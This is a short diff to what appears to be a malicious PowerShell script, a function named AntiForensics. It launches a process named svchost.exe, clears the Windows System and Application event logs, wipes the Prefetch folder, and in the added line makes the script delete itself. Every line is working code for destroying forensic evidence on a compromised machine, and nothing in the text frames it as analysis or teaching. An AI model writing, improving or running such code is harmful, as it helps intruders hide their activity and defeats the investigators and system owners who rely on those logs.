@@ -276,7 +276,8 @@ function AntiForensics {
         $null = [Diagnostics.Process]::Start("svchost.exe", "")
         wevtutil cl System
         wevtutil cl Application
-        Remove-Item "$env:SYSTEMROOT\Prefetch\*" -Force -ErrorAction SilentlyContinue
+        Remove-Item -Path "$env:SYSTEMROOT\Prefetch\*" -Force -ErrorAction SilentlyContinue
+        Remove-Item -Path "$PSCommandPath" -Force -ErrorAction SilentlyContinue
     }
     catch {}
 }
